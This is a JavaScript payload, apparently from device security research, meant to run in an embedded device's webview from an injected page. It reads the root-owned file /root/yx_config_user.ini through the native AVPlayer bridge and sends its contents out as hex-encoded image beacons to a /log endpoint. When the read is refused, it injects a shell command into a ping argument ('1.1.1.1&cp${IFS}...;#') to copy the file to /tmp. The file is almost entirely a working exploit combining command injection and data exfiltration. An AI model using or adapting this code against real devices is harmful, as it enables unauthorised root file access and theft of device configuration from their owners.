/* READ-ONLY: report /root/yx_config_user.ini back to the lab server.
 *
 * Runs inside the SUI's webview from an injected page. It uses the same native
 * bridge the launcher uses - new AVPlayer() then Ag_textFile_open / read /
 * close - so it reads as root without installing telnetd or any listener on
 * the box. Nothing is written, nothing is started.
 *
 * Transport: hex-encoded GETs to /log on this same origin. Hex because the
 * webview is old enough that btoa and encodeURIComponent on binary are both
 * unreliable; 400 hex chars per request keeps the URL short.
 *
 *   ?k=ini&stage=meta&bytes=<n>&n=<chunks>
 *   ?k=ini&stage=chunk&i=<idx>&n=<chunks>&d=<hex>
 *   ?k=ini&stage=done&bytes=<n>
 *   ?k=ini&stage=<error>&e=<detail>          on failure
 *
 * The server reassembles by index, so out-of-order or retried beacons are fine.
 * Read the reference notes on this API: Ag_textFile_read returns the string "0"
 * at EOF (not a chunk of data), and the read loop needs a sane iteration guard.
 */
(function () {
  var PATH = "/root/yx_config_user.ini";
  var COPY = "/tmp/ini_probe.txt";     // fallback target if the bridge refuses PATH
  var READ_SIZE = 512;        // native read granularity used elsewhere on this box
  var MAX_READS = 4096;       // ~2 MB guard; the ini is ~263 bytes
  var WAIT_MS = 15000;        // how long to wait for AVPlayer to appear
  var URL_CHUNK = 400;        // hex chars per beacon

  function beacon(q) {
    try {
      var img = new Image();
      img.src = "/log?" + q;
    } catch (e) { }
  }

  function fail(stage, detail) {
    beacon("k=ini&stage=" + stage + "&e=" + encodeURIComponent(String(detail).slice(0, 80)));
  }

  function hex(s) {
    var out = "", i, c;
    for (i = 0; i < s.length; i++) {
      c = s.charCodeAt(i);
      if (c > 255) { c = 63; }          // '?' - the ini is ASCII
      out += ("0" + c.toString(16)).slice(-2);
    }
    return out;
  }

  function spin(ms) {
    // Ag_network_ping returns immediately (background thread), so wait for it.
    var t = new Date().getTime();
    while (new Date().getTime() - t < ms) { }
  }

  function ap() {
    try {
      if (typeof AVPlayer !== "undefined") { return AVPlayer; }
      if (window.AVPlayer) { return window.AVPlayer; }
      if (window.top && window.top.AVPlayer) { return window.top.AVPlayer; }
    } catch (e) { }
    return null;
  }

  function send(text) {
    var h = hex(text);
    var n = Math.ceil(h.length / URL_CHUNK) || 1;
    var i;
    beacon("k=ini&stage=meta&bytes=" + text.length + "&n=" + n);
    for (i = 0; i < n; i++) {
      beacon("k=ini&stage=chunk&i=" + i + "&n=" + n + "&d=" +
             h.substr(i * URL_CHUNK, URL_CHUNK));
    }
    beacon("k=ini&stage=done&bytes=" + text.length);
  }

  function read(A) {
    var p, fd, chunk, out = "", reads = 0;
    try {
      p = new A();
    } catch (e) {
      fail("ctor_err", e);
      return;
    }
    try {
      fd = p.Ag_textFile_open(PATH);
    } catch (e) {
      fail("open_err", e);
      return;
    }

    /* The bridge can refuse a file it did not create (seen on a live unit:
       open('/root/yx_config_user.ini') -> -1 while files under /tmp open
       fine). Fall back to asking the box to copy it somewhere neutral with a
       short shell command - no listener is installed. */
    if (fd === -1 || fd === null || fd === undefined) {
      var cmd = "1.1.1.1&cp${IFS}" + PATH + "${IFS}" + COPY + ";#";
      beacon("k=ini&stage=copy&cmd=" + encodeURIComponent(cmd));
      try { p.Ag_network_ping(cmd, 0); } catch (e2) { fail("copy_err", e2); return; }
      spin(3000);                       /* it runs in a background thread */
      try { fd = p.Ag_textFile_open(COPY); } catch (e3) { fail("reopen_err", e3); return; }
      if (fd === -1 || fd === null || fd === undefined) {
        fail("open_failed", "fd=" + String(fd));
        return;
      }
      beacon("k=ini&stage=copy_ok", "fd=" + String(fd));
    }

    while (reads++ < MAX_READS) {
      try {
        chunk = p.Ag_textFile_read(fd, READ_SIZE);
      } catch (e) {
        fail("read_err", "at=" + out.length + ":" + e);
        break;
      }
      if (chunk === "0" || chunk === 0 || chunk === null ||
          chunk === undefined || chunk === "") {
        break;
      }
      out += String(chunk);
    }
    try { p.Ag_textFile_close(fd); } catch (e) { }

    if (out.length === 0) { fail("empty", "0 bytes read"); return; }
    send(out);
  }

  var t0 = new Date().getTime();
  (function wait() {
    var A = ap();
    if (!A) {
      if (new Date().getTime() - t0 > WAIT_MS) { fail("no_avplayer", "waited 15s"); }
      else { setTimeout(wait, 250); }
      return;
    }
    read(A);
  })();
})();
